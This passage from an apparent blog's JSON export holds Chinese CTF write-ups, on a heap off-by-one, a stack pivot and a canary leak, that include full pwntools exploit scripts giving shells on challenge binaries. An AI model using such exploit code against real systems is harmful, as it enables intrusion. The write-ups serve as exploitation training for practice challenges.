buffer if needed. */ if (f-&gt;_IO_write_base == NULL) &#123; _IO_doallocbuf (f); _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base); &#125; /* Otherwise must be currently reading. If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end, logically slide the buffer forwards one block (by setting the read pointers to all point at the beginning of the block). This makes room for subsequent output. Otherwise, set the read pointers to _IO_read_end (leaving that alone, so it can continue to correspond to the external position). */ if (__glibc_unlikely (_IO_in_backup (f))) &#123; size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr; _IO_free_backup_area (f); f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base); f-&gt;_IO_read_ptr = f-&gt;_IO_read_base; &#125; if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end) f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base; f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr; f-&gt;_IO_write_base = f-&gt;_IO_write_ptr; f-&gt;_IO_write_end = f-&gt;_IO_buf_end; f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end; f-&gt;_flags |= _IO_CURRENTLY_PUTTING; if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) f-&gt;_IO_write_end = f-&gt;_IO_write_ptr; &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-&gt;_IO_write_ptr++ = ch; if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;)) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch;&#125; 首先我们需要绕过第一个if判断 那么就使得f-&gt;_flags &amp; _IO_NO_WRITES为0 接下要绕过第二个判断 那么使得(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)为1 最后其调用了_IO_do_write函数 该函数实际上是new_do_write函数 static size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123; size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; count = _IO_SYSWRITE (fp, data, to_do); if (fp-&gt;_cur_column &amp;&amp; count) fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end); return count;&#125; 而else if判断式中的fp-&gt;_IO_write_base - fp-&gt;_IO_read_end我们满足不了 如果fp-&gt;_IO_read_end的值设置为0 那么_IO_SYSSEEK的第二个参数值就会过大 如果设置fp-&gt;_IO_write_base = fp-&gt;_IO_read_end的话 那么在其它地方就会有问题 因为fp-&gt;_IO_write_base 不能大于 fp-&gt;_IO_write_end 所以这里要设置fp-&gt;_flags | _IO_IS_APPENDING，避免进入else if 分支 综上所述 因此我们要泄露基址的话 需要将flag改为0xfbad1800 并且随着第四个参数_IO_write_base的不同 可以泄露不同的libc地址(原理不懂 照抄吧) payload = p64(0xfbad1800)+p64(0)*3+b&quot;\\x58&quot; //泄露_IO_file_jumps payload = p64(0xfbad3887)+p64(0)*3+p8(0) //泄露_IO_2_1_stdin_ if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"hitcontraining_heapcreator","slug":"hitcontraining-heapcreator","date":"2022-12-18T16:06:42.000Z","updated":"2023-09-14T17:19:14.000Z","comments":true,"path":"2022/12/19/hitcontraining-heapcreator/","link":"","permalink":"http://example.com/2022/12/19/hitcontraining-heapcreator/","excerpt":"","text":"做完这道题又学到一种合并堆的手法 感觉收获颇丰 checksec 看一下 [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 常规的64位堆菜单题 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[8]; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); while ( 1 ) &#123; menu(); read(0, buf, 4uLL); switch ( atoi(buf) ) &#123; case 1: create_heap(); break; case 2: edit_heap(); break; case 3: show_heap(); break; case 4: delete_heap(); break; case 5: exit(0); default: puts(&quot;Invalid Choice&quot;); break; &#125; &#125;&#125; unsigned __int64 create_heap()&#123; __int64 v0; // rbx int i; // [rsp+4h] [rbp-2Ch] size_t size; // [rsp+8h] [rbp-28h] char buf[8]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-18h] v5 = __readfsqword(0x28u); for ( i = 0; i &lt;= 9; ++i ) &#123; if ( !*(&amp;heaparray + i) ) &#123; *(&amp;heaparray + i) = malloc(0x10uLL); if ( !*(&amp;heaparray + i) ) &#123; puts(&quot;Allocate Error&quot;); exit(1); &#125; printf(&quot;Size of Heap : &quot;); read(0, buf, 8uLL); size = atoi(buf); v0 = *(&amp;heaparray + i); *(v0 + 8) = malloc(size); if ( !*(*(&amp;heaparray + i) + 1) ) &#123; puts(&quot;Allocate Error&quot;); exit(2); &#125; **(&amp;heaparray + i) = size; printf(&quot;Content of heap:&quot;); read_input(*(*(&amp;heaparray + i) + 1), size); puts(&quot;SuccessFul&quot;); return __readfsqword(0x28u) ^ v5; &#125; &#125; return __readfsqword(0x28u) ^ v5;&#125; 先来分析一下create函数 首先创建了一个0x10大小的堆块 并将其地址存储在bss段上的一个全局数组里面 随后让我们输入要创建的堆块大小 这里我们先将这个0x10大小的堆块称为伴随堆块 接着将创建的这个堆块的地址存储在伴随堆块的第二个字长处 并且将创建的大小存在第一个字长处 基础的堆还是很常见这种创建两个chunk的 一般利用手法就是覆盖地址 来任意地址写 这里留意一下就可以了 再来看一下edit函数 unsigned __int64 edit_heap()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; printf(&quot;Content of heap : &quot;); read_input(*(*(&amp;heaparray + v1) + 1), **(&amp;heaparray + v1) + 1LL); puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; 注意一下这个read_input函数就好了 跟进一下看是干什么的 ssize_t __fastcall read_input(void *a1, size_t a2)&#123; ssize_t result; // rax result = read(0, a1, a2); if ( result &lt;= 0 ) &#123; puts(&quot;Error&quot;); _exit(-1); &#125; return result;&#125; 理解起来没什么难度 * (*(&amp;heaparray + v1) + 1)) 是我们创建的堆块的地址 **(&amp;heaparray + v1) + 1LL是伴随堆块的第一个字长处的内容 也就是我们输入的size 二者结合起来 这个函数就是向我们创建的堆块中输入我们之前定义好的size大小 也就是不能进行堆溢出了(不破坏堆结构的情况下) 接着再看一下show函数 unsigned __int64 show_heap()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; printf(&quot;Size : %ld\\nContent : %s\\n&quot;, **(&amp;heaparray + v1), *(*(&amp;heaparray + v1) + 1)); puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; 用的是printf函数 遇到\\x00截停 这个就不用说了 留意一下 反正泄露基址肯定是用到show函数的 最后是比较关键的delete函数 看一下我们有什么漏洞可以利用吗 unsigned __int64 delete_heap()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; free(*(*(&amp;heaparray + v1) + 1)); free(*(&amp;heaparray + v1)); *(&amp;heaparray + v1) = 0LL; puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; 很遗憾的是把指针置零了 不能UAF 或者double free来任意写 程序遍历到这里 就应该有个差不多的思路了 先泄露基址 然后再通过伴随堆块的地址索引来任意写 那么具体怎么实现呢？ 我这里选择的是unsortedbin 泄露main_arena地址 没办法 太好用了 add(0x88,b&quot;aaaa&quot;) #0add(0x20,b&quot;bbbb&quot;) #1add(0x20,b&quot;cccc&quot;) #2delete(0)payload = b&#x27;a&#x27;*7+b&#x27;b&#x27;add(0x88,payload) #0show(0)io.recvuntil(&quot;b&quot;)main_arena = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arena - (0x7fa0ee626b78-0x7fa0ee262000) chunk1和chunk2的作用我们这里可以先不用去纠结 先来解释一下payload为什么这样写 因为我们要通过show函数泄露基址的话 刚才也说过了 printf函数遇到\\x00就会截停 所以fd域那边就会截停 但是我们创建堆块一定要输入数据 所以泄露fd的话最后得到的是不完整的地址 所以干脆覆盖满fd域 这样就会一直输出到fd域的地址 就泄露了基址 libc的计算办法我前面的博客有说到 这里不赘述 接下来的难点还是在如何利用伴随堆块来任意写 我们没有办法进行堆溢出 不过我们还是有办法溢出一点点字节的 如果我们申请一个0xn8的堆块 但是实际上系统分配给我们的是0xn0的堆块 但是存储起来的size是多出了16个字节的 因为64位情况下 堆块的最小单位是0x10字节 所以我们可以溢出覆盖到下一个chunk的size域 payload = cyclic(0x88)+b&quot;\\x71&quot;edit(0,payload)delete(1) 这里溢出覆盖到的实际上是chunk1的伴随堆块 这也导致其往后0x70的空间都被划为这个堆块的区域 因为glibc识别到了size 被我们所欺骗了 这时候释放chunk1 bin中就会存储一个0x70大小的free chunk 我们重新申请一个chunk的话 就拥有了0x60大小的空间 同时 你还要注意 chunk2的指针是仍然存在的 而我们获得的空间是包含chunk2的伴随堆块 这时候你回忆一下 edit函数是根据伴随堆块的第二个字长处的地址来写入第一个字长处大小的数据 所以我们通过覆盖这两个字长 就可以做到任意地址任意长度写 payload = cyclic(0x8*10)+p64(0x8)+p64(elf.got[&#x27;free&#x27;])add(0x60,payload) #1#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf02a4edit(2,p64(onegadget_addr)) 随后还有最后一个你可能会犯错的地方 你之前def的函数 如果有包括delete函数执行完以后 程序给你输出的done 那么是接收不到的 因为如果pwn成功了 直接就进行了系统调用 没有机会输出done的 手动再写一下就可以了 完整exp: from pwn import*from LibcSearcher import *#io = remote(&quot;node4.buuoj.cn&quot;,29378)io = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu16_64.so&quot;)context.log_level = &quot;debug&quot;def add(size,payload): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Size of Heap : &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content of heap:&quot;) io.send(payload) io.recvuntil(&quot;SuccessFul&quot;)def edit(index,payload): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Content of heap : &quot;) io.send(payload) io.recvuntil(&quot;Done !&quot;)def show(index): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index))def delete(index): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Done !&quot;)add(0x88,b&quot;aaaa&quot;) #0 add(0x20,b&quot;bbbb&quot;) #1add(0x20,b&quot;cccc&quot;) #2delete(0)payload = b&#x27;a&#x27;*7+b&#x27;b&#x27;add(0x88,payload) #0show(0)io.recvuntil(&quot;b&quot;)main_arena = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arena - (0x7fa0ee626b78-0x7fa0ee262000)payload = cyclic(0x88)+b&quot;\\x71&quot;edit(0,payload)delete(1)payload = cyclic(0x8*10)+p64(0x8)+p64(elf.got[&#x27;free&#x27;])add(0x60,payload) #1gdb.attach(io)#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf02a4edit(2,p64(onegadget_addr))io.recvuntil(&quot;Your choice :&quot;)io.sendline(b&quot;4&quot;)io.recvuntil(&quot;Index :&quot;)io.sendline(b&quot;2&quot;)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"gyctf_2020_borrowstack","slug":"gyctf-2020-borrowstack","date":"2022-12-18T14:10:11.000Z","updated":"2023-09-14T17:19:10.000Z","comments":true,"path":"2022/12/18/gyctf-2020-borrowstack/","link":"","permalink":"http://example.com/2022/12/18/gyctf-2020-borrowstack/","excerpt":"","text":"一题栈迁移 但是有涉及到内存越界的问题 记录一下 防止以后踩坑 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida打开看一下 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[96]; // [rsp+0h] [rbp-60h] BYREF setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(aWelcomeToStack); read(0, buf, 0x70uLL); puts(&quot;Done!You can check and use your borrow stack now!&quot;); read(0, &amp;bank, 0x100uLL); return 0;&#125; buf局部变量 bank位于bss段 栈溢出的空间太少了 构造不了rop链 所以是想到把rop写到bank里面 然后栈迁移到对应位置 ps: 这里的逻辑关系得清楚一下 我们平时栈溢出覆盖返回地址 实际上利用main函数这个栈帧结束以后 会返回到父函数 覆盖了返回地址 所以哪怕我们先覆盖了返回地址 但是接下来程序并没有立刻结束 所以并不会影响我们修改bank的内容 此时exp: from pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) print(hex(libc_addr)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=28099elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)main_addr = elf.sym[&#x27;main&#x27;]#io = remoteconnect(ip,port)io = process(&quot;./pwn&quot;)debug(1)io.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)bss_addr = 0x601080leave_addr = 0x400699puts_plt = 0x4004e0rdi_addr = 0x400703ret_addr = 0x4004c9puts_got = elf.got[&#x27;puts&#x27;]read_got = elf.got[&#x27;read&#x27;]payload = cyclic(0x60)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.recvuntil(&quot;Done!You can check and use your borrow stack now!&quot;)payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload) 但是发现行不通 gdb动调了一下发现 好像跳转到了奇怪的地方 看了一下地址 好像是跑到了bss段上面的got表了 那有没有什么办法可以抬高栈(往低地址处抬高) 我们想到了ret指令 刚好可以读入0x100字节的数据在bank里面 payload = p64(ret_addr)*20+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) 接着就可以成功泄露puts的真实地址了 接下来两个办法 既然只能刚好覆盖到ret addr 那就直接覆盖成onegadget 因为libc基址已经知道了 或者重复上面的操作 按照常规的system进行系统调用 不过尝试了一下发现不行 也不清楚是什么原因 完整exp: from pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) print(hex(libc_addr)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=28099elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)main_addr = elf.sym[&#x27;main&#x27;]#io = remoteconnect(ip,port)io = process(&quot;./pwn&quot;)debug(1)io.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)bss_addr = 0x601080leave_addr = 0x400699puts_plt = 0x4004e0rdi_addr = 0x400703ret_addr = 0x4004c9puts_got = elf.got[&#x27;puts&#x27;]read_got = elf.got[&#x27;read&#x27;]payload = cyclic(0x60)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.recvuntil(&quot;Done!You can check and use your borrow stack now!&quot;)payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)gdb.attach(io)io.sendline(payload)io.recv()puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr+0x4526aio.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)payload = cyclic(0x68)+p64(onegadget_addr)io.sendline(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"others_babystack","slug":"others-babystack","date":"2022-12-16T12:43:10.000Z","updated":"2023-09-14T17:20:16.000Z","comments":true,"path":"2022/12/16/others-babystack/","link":"","permalink":"http://example.com/2022/12/16/others-babystack/","excerpt":"","text":"一道蛮神奇的题 两种解法 不过一种有点非常规 不知道出题人怎么设置的 checksec看一下保护机制 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ida查看一下main函数 __int64 __fastcall main(int a1, char **a2, char **a3)&#123; int v3; // eax char s[136]; // [rsp+10h] [rbp-90h] BYREF unsigned __int64 v6; // [rsp+98h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); memset(s, 0, 0x80uLL); while ( 1 ) &#123; menu(); v3 = choice(); switch ( v3 ) &#123; case 2: puts(s); break; case 3: return 0LL; case 1: read(0, s, 0x100uLL); break; default: sendline(&quot;invalid choice&quot;); break; &#125; sendline(&amp;unk_400AE7); &#125;&#125; menu函数这里就不放了 反正就看这些源码也能知道各个选项对应什么作用 两个比较重要的地方 有一个puts泄露的机会 还有read函数可以读入数据 考虑到程序开启了金丝雀 所以这里的puts可以用来泄露金丝雀 覆盖金丝雀的最后一位 使其不为\\x00 因为puts或者printf截停一个字符串就是靠\\x00 这里泄露的时候有个小坑 就是你不能想着读入后7位 然后最后用p64把他补全成八位 因为第八位也恒为00嘛 但是pwntools的p64补全是在首位补全 from pwn import*io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;canary = 0x11223344556677payload = p64(canary)io.sendline(payload) 如上程序 假设canary值为上述那样 我们debug看一下最后会输送什么样的数据 [DEBUG] Sent 0x9 bytes: 00000000 77 66 55 44 33 22 11 00 0a │wfUD│3&quot;··│·│ 00000009 很明显 小端序存储 所以00实际上是被放在了首位 所以可以用sendline多出来的\\n字节覆盖\\x00 然后接收八个字节的数据 最后-0xa 就能得到带有00的canary exp: from pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29125elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#main_addr = elf.sym[&#x27;main&#x27;]main_addr = 0x400908io = remoteconnect(ip,port)#io = process(&quot;./pwn&quot;)debug(1)puts_plt = 0x400690rdi_addr = 0x400a93puts_got = elf.got[&#x27;puts&#x27;]leave_addr = 0x400824io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x87)+b&quot;1&quot;io.sendline(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recvuntil(&quot;1&quot;)canary = u64(io.recv(8).ljust(8,b&quot;\\x00&quot;))-0xa 接下来还要想办法控制程序执行流 一开始看到read只能读入0x100的数据 我是觉得不能构造rop链来泄露libc基址 但是最后查看wp的时候 发现大家都是用泄露基址的办法做的 也是比较神奇 数据竟然能超出限制读入 第一种办法用到的是泄露__libc_start_main函数的地址 稍微了解一下程序函数调用就会知道 main函数并不是程序第一个调用的 __libc_start_main函数的地址应该是在rbp的下一个字长处 io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x98)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recv(0x98)start_addr = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = start_addr - 240 - libc.sym[&#x27;__libc_start_main&#x27;]print(hex(libc_addr)) 这里泄露出来的start_addr之所以要减去240 还得要动调来看 泄露出来的地址距离__libc_start_main函数还有231偏移 当然这只是本地libc的偏移 远程的等下还得微调一下 此时我们得到算式: libc_addr = start_addr - 231 - libc.sym[&#x27;__libc_start_main&#x27;] 在本地上 其后三位是000 但是远程环境不同 运行看一下差了多少 得到的值是0x7f3fea3e8009 多了9 那就减去240就可以得到远程的libc基址了 虽然我们得到了libc基址 但是由于read可以溢出的长度不够我们构造一个system链 所以这里采取修改ret addr为one_gadget 完整exp: from pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29125elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#main_addr = elf.sym[&#x27;main&#x27;]main_addr = 0x400908io = remoteconnect(ip,port)#io = process(&quot;./pwn&quot;)debug(1)puts_plt = 0x400690rdi_addr = 0x400a93puts_got = elf.got[&#x27;puts&#x27;]leave_addr = 0x400824io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x87)+b&quot;1&quot;io.sendline(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recvuntil(&quot;1&quot;)canary = u64(io.recv(8).ljust(8,b&quot;\\x00&quot;))-0xaio.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x98)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recv(0x98)start_addr = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = start_addr - 240 - libc.sym[&#x27;__libc_start_main&#x27;]#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf1147io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = b&quot;a&quot;*0x88+p64(canary)+p64(0xabcdabcd)+p64(onegadget_addr)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.send(b&quot;3&quot;)io.interactive() 不过这题不知道为啥 read函数虽然对输入的数据进行了限制 但是好像还是可以超额输入 原理暂时还不清楚 留个坑 所以这题可以用构造rop链 泄露libc基址 from pwn import *from LibcSearcher import 